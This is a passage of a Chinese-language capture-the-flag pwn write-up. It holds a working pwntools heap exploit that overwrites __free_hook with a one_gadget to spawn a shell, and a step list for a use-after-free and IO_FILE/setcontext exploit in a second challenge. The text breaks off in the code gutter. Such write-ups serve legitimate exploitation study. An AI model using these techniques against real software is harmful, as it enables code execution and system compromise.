class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;XX&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">2</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;CW&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">1</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-built_in">str</span>(p8((<span class="hljs-number">4</span>))).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+p8(<span class="hljs-number">5</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>add(<span class="hljs-number">0x50</span>,tf=<span class="hljs-string">&#x27;y&#x27;</span>,content=<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x10</span>,name=(<span class="hljs-string">&#x27;ZZ&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">3</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;XX&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">3</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;CW&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">1</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-built_in">str</span>(p8((<span class="hljs-number">6</span>))).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+p8(<span class="hljs-number">7</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>add(<span class="hljs-number">0x50</span>,tf=<span class="hljs-string">&#x27;y&#x27;</span>,content=<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x10</span>,name=(<span class="hljs-string">&#x27;ZZ&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">4</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;XX&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">3</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;CW&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">1</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-built_in">str</span>(p8((<span class="hljs-number">8</span>))).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+p8(<span class="hljs-number">9</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>add(<span class="hljs-number">0x50</span>,tf=<span class="hljs-string">&#x27;y&#x27;</span>,content=<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x10</span>,name=(<span class="hljs-string">&#x27;ZZ&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">5</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;XX&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">3</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;CW&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">1</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-built_in">str</span>(p8((<span class="hljs-number">10</span>))).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+p8(<span class="hljs-number">11</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>add(<span class="hljs-number">0x50</span>,tf=<span class="hljs-string">&#x27;y&#x27;</span>,content=<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x10</span>,name=(<span class="hljs-string">&#x27;ZZ&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">6</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;XX&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">5</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;CW&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">6</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-built_in">str</span>(p8((<span class="hljs-number">7</span>))).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+p8(<span class="hljs-number">12</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br><span class="hljs-comment"># pause()</span><br>add(<span class="hljs-number">0x50</span>,tf=<span class="hljs-string">&#x27;y&#x27;</span>,content=<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x10</span>,name=(<span class="hljs-string">&#x27;CC&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">0</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;SW&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">8</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;AD&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">6</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-built_in">str</span>(p8((<span class="hljs-number">9</span>))).ljust(<span class="hljs-number">4</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+p8(<span class="hljs-number">13</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br><span class="hljs-comment"># add(0x50,tf=&#x27;y&#x27;,content=&#x27;u&#x27;*0x10,name=(&#x27;ZZ&#123;&#125;&#x27;.format(7)).ljust(8,&#x27;\0&#x27;)+(&#x27;XX&#123;&#125;&#x27;.format(5)).ljust(8,&#x27;\0&#x27;)+(&#x27;CW&#123;&#125;&#x27;.format(6)).ljust(8,&#x27;\0&#x27;)+str(p8((5))).ljust(8,&#x27;\0&#x27;)+p8(11).ljust(8,&#x27;\0&#x27;))</span><br><span class="hljs-comment"># for i in range(7-1-i):</span><br><span class="hljs-comment">#     dele(&#x27;ZZ&#123;&#125;&#x27;.format(i))</span><br><br>dele(<span class="hljs-string">&#x27;ZZ&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">6</span>))<br>dele(<span class="hljs-string">&#x27;ZZ&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">5</span>))<br>dele(<span class="hljs-string">&#x27;ZZ&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">4</span>))<br>dele(<span class="hljs-string">&#x27;ZZ&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">3</span>))<br>dele(<span class="hljs-string">&#x27;ZZ&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">2</span>))<br>dele(<span class="hljs-string">&#x27;ZZ&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">1</span>))<br>dele(<span class="hljs-string">&#x27;ZZ&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">0</span>))<br><br>dele(<span class="hljs-string">&#x27;AB&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">0</span>))<br>dele(<span class="hljs-string">&#x27;CC&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">0</span>))<br>dele(<span class="hljs-string">&#x27;AB&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">3</span>))<br><br>add(<span class="hljs-number">0x50</span>,tf=<span class="hljs-string">&#x27;y&#x27;</span>,content=<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x10</span>,name=(<span class="hljs-string">&#x27;ZZ&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">0</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;XX&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">0</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;CW&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">0</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-built_in">str</span>(p8((<span class="hljs-number">0</span>))).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+p8(<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>add(<span class="hljs-number">0x50</span>,tf=<span class="hljs-string">&#x27;y&#x27;</span>,content=<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x10</span>,name=(<span class="hljs-string">&#x27;ZZ&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">1</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;XX&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">1</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;CW&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">1</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-built_in">str</span>(p8((<span class="hljs-number">2</span>))).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+p8(<span class="hljs-number">3</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>add(<span class="hljs-number">0x50</span>,tf=<span class="hljs-string">&#x27;y&#x27;</span>,content=<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x10</span>,name=(<span class="hljs-string">&#x27;ZZ&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">2</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;XX&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">2</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;CW&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">1</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-built_in">str</span>(p8((<span class="hljs-number">4</span>))).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+p8(<span class="hljs-number">5</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>add(<span class="hljs-number">0x50</span>,tf=<span class="hljs-string">&#x27;y&#x27;</span>,content=<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x10</span>,name=(<span class="hljs-string">&#x27;ZZ&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">3</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;XX&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">3</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;CW&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">1</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-built_in">str</span>(p8((<span class="hljs-number">6</span>))).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+p8(<span class="hljs-number">7</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>add(<span class="hljs-number">0x50</span>,tf=<span class="hljs-string">&#x27;y&#x27;</span>,content=<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x10</span>,name=(<span class="hljs-string">&#x27;ZZ&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">4</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;XX&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">3</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;CW&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">1</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-built_in">str</span>(p8((<span class="hljs-number">8</span>))).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+p8(<span class="hljs-number">9</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>add(<span class="hljs-number">0x50</span>,tf=<span class="hljs-string">&#x27;y&#x27;</span>,content=<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x10</span>,name=(<span class="hljs-string">&#x27;ZZ&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">5</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;XX&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">3</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;CW&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">1</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-built_in">str</span>(p8((<span class="hljs-number">10</span>))).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+p8(<span class="hljs-number">11</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>add(<span class="hljs-number">0x50</span>,tf=<span class="hljs-string">&#x27;y&#x27;</span>,content=<span class="hljs-string">&#x27;/bin/sh\0&#x27;</span>,name=(<span class="hljs-string">&#x27;ZZ&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">6</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;XX&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">5</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;CW&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">6</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-built_in">str</span>(p8((<span class="hljs-number">7</span>))).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+p8(<span class="hljs-number">12</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br><br>add(<span class="hljs-number">0x50</span>,tf=<span class="hljs-string">&#x27;y&#x27;</span>,content=p64(libc.sym.__free_hook),name=(<span class="hljs-string">&#x27;CC&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">0</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;SW&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">8</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;AD&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">6</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-built_in">str</span>(p8((<span class="hljs-number">9</span>))).ljust(<span class="hljs-number">4</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+p8(<span class="hljs-number">13</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br><span class="hljs-comment"># add(0x50,tf=&#x27;y&#x27;,content=&#x27;u&#x27;*0x10,name=(&#x27;CC&#123;&#125;&#x27;.format(0)).ljust(8,&#x27;\0&#x27;)+(&#x27;SW&#123;&#125;&#x27;.format(8)).ljust(8,&#x27;\0&#x27;)+(&#x27;AD&#123;&#125;&#x27;.format(6)).ljust(8,&#x27;\0&#x27;)+str(p8((9))).ljust(4,&#x27;\0&#x27;)+p8(13).ljust(8,&#x27;\0&#x27;))</span><br>add(<span class="hljs-number">0x50</span>,tf=<span class="hljs-string">&#x27;y&#x27;</span>,content=<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x10</span>,name=(<span class="hljs-string">&#x27;FF&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">2</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;SW&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">8</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;AD&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">6</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-built_in">str</span>(p8((<span class="hljs-number">1</span>))).ljust(<span class="hljs-number">4</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+p8(<span class="hljs-number">13</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>add(<span class="hljs-number">0x50</span>,tf=<span class="hljs-string">&#x27;y&#x27;</span>,content=<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x10</span>,name=(<span class="hljs-string">&#x27;FF&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">3</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;SW&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">8</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;AD&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">6</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-built_in">str</span>(p8((<span class="hljs-number">2</span>))).ljust(<span class="hljs-number">4</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+p8(<span class="hljs-number">3</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>og = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x4f2a5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rsp &amp; 0xf == 0</span><br><span class="hljs-string">  rcx == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4f302 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x40] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xe534f execve(&quot;/bin/sh&quot;, r13, rbx)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [r13] == NULL || r13 == NULL</span><br><span class="hljs-string">  [rbx] == NULL || rbx == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xe54f7 execve(&quot;/bin/sh&quot;, [rbp-0x88], [rbp-0x70])</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [[rbp-0x88]] == NULL || [rbp-0x88] == NULL</span><br><span class="hljs-string">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xe54fe execve(&quot;/bin/sh&quot;, rcx, [rbp-0x70])</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rcx] == NULL || rcx == NULL</span><br><span class="hljs-string">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xe5502 execve(&quot;/bin/sh&quot;, rcx, rdx)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rcx] == NULL || rcx == NULL</span><br><span class="hljs-string">  [rdx] == NULL || rdx == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x10a2fc execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x10a308 execve(&quot;/bin/sh&quot;, rsi, [rax])</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsi] == NULL || rsi == NULL</span><br><span class="hljs-string">  [[rax]] == NULL || [rax] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>ones = [libc_base + <span class="hljs-built_in">int</span>(i,<span class="hljs-number">16</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> re.findall(<span class="hljs-string">r&#x27;\n(.+?) execve&#x27;</span>,og)] + [libc_base + <span class="hljs-built_in">int</span>(i,<span class="hljs-number">16</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> re.findall(<span class="hljs-string">r&#x27;\n(.+?) posix_spawn&#x27;</span>,og)]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(ones)):<br>    lg(<span class="hljs-string">&#x27;ONES[%d]&#x27;</span>%i,ones[i])<br><span class="hljs-comment"># add(0x50,tf=&#x27;y&#x27;,content=&#x27;u&#x27;*0x10,name=(&#x27;CC&#123;&#125;&#x27;.format(1)).ljust(8,&#x27;\0&#x27;)+(&#x27;SW&#123;&#125;&#x27;.format(2)).ljust(8,&#x27;\0&#x27;)+(&#x27;AD&#123;&#125;&#x27;.format(2)).ljust(8,&#x27;\0&#x27;)+str(p8((3))).ljust(4,&#x27;\0&#x27;)+p8(13).ljust(8,&#x27;\0&#x27;))</span><br>add(<span class="hljs-number">0x50</span>,tf=<span class="hljs-string">&#x27;y&#x27;</span>,content=p64(ones[<span class="hljs-number">1</span>]),name=(<span class="hljs-string">&#x27;FF&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">4</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;SW&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">8</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+(<span class="hljs-string">&#x27;AD&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">8</span>)).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+<span class="hljs-built_in">str</span>(p8((<span class="hljs-number">9</span>))).ljust(<span class="hljs-number">4</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)+p8(<span class="hljs-number">3</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br><br><br><br><br><span class="hljs-comment"># add(0x100,tf=&#x27;y&#x27;,content=&#x27;u&#x27;*0x10,name=&#x27;FK3&#x27;.ljust(8,&#x27;\0&#x27;)+&#x27;NM3&#x27;.ljust(8,&#x27;\0&#x27;)+&#x27;ND3&#x27;.ljust(8,&#x27;\0&#x27;)+&#x27;\x05&#x27;.ljust(8,&#x27;\0&#x27;)+&#x27;\x06&#x27;.ljust(8,&#x27;\0&#x27;))</span><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="pwn2"><a class="header-anchor" href="#pwn2">¶</a>pwn2</h2><p>一血题</p><p>这题的漏洞也很直接，就是一个 UAF，关键在堆风水和利用。</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220731231941452.png" alt="pwn2-1"></p><p>但是每次 calloc 会清空堆块内容，leak libc 只能依赖 free 时的内容显示。</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220731232057742.png" alt="pwn2-2"></p><p>后门函数，一次写固定值，一次任意写。</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220731232342257.png" alt="pwn2-3"></p><h3 id="具体思路"><a class="header-anchor" href="#具体思路">¶</a>具体思路</h3><ol><li>利用 UAF 构造 fastbin double free，leak 堆地址的同时去构造堆块重叠</li><li>分割 Largebin 至 tcache 范围内，避免再次 free 报错，利用 Offer by one 这个一次性函数填补 <code>\x00</code> 后 free，leak 出libc。</li><li>这样我们很轻易的可以控制 servant，进入后门函数</li><li>后门函数我采取的思路是不管固定值的这个，劫持 stderr 为堆地址，perror 进入 __vxprintf 触发 IO 流</li><li>IO 流构造比较复杂，也是采取的调试改风水的思路，控制 <code>_wide_data</code> 结构体，setcontext 配合 gets 完成 shellcode 利用</li><li>详见 exp</li></ol><h3 id="Exp"><a class="header-anchor" href="#Exp">¶</a>Exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span 